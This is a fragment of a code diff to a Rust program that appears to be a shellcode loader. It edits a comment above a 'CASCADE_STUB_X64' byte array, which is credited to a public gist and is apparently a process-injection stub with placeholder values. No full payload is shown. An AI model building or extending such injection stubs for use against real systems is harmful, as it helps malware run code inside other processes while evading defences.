@@ -30,7 +30,7 @@ mod structs;
 
 fn main() {
     let shellcode = get_shellcode();
-    // adapted from - https://gist.github.com/mgeeky/ac3ef69a3c5a32cc32ce596115371173 (modified last placeholder to 0x6666666666666666)
+    // adapted from - https://gist.github.com/mgeeky/ac3ef69a3c5a32cc32ce596115371173 (modified duplicate placeholder)
     #[allow(non_snake_case)]
     let CASCADE_STUB_X64 = [
         0x48, 0x31, 0xC0, 0x48, 0xBA, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x02,
